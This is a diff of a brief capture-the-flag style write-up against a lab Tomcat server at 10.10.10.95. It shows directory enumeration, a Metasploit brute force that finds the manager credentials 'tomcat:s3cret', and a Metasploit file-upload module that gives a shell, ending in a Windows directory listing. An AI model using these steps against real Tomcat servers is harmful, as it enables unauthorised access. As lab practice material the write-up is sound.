@@ -1,4 +1,5 @@
 1. There is only one port is open I found the content that includes the webpage.
+```bash
 ┌──(sabeshan㉿kali)-[~]
 └─$ dirsearch -u http://10.10.10.95:8080/     
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
@@ -49,12 +50,14 @@ Target: http://10.10.10.95:8080/
 [16:31:09] 200 -    6B  - /shell/                                           
                                                                              
 Task Completed
+```
 ===================================================
 2. "msf6 auxiliary(scanner/http/tomcat_mgr_login) > " This module was use to enumerate login creds by using metasploit.
 Finally credentials wass founded with these methods 
 "[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret"
 =======================================================
 3. There is a vulnerable file upload vulnerability there
+```bash
 msf6 auxiliary(scanner/http/tomcat_mgr_login) > search tomcat_mgr
 
 Matching Modules
@@ -184,7 +187,7 @@ dir
 08/22/2013  06:39 PM    <DIR>          Public
                0 File(s)              0 bytes
                4 Dir(s)   2,418,315,264 bytes free
-
+```
 with that file upload using metasploit i can gain the control form this.
 ------------------------------------------------------------------------------------
 There is no esaclation with this machine, there is direct access to root.
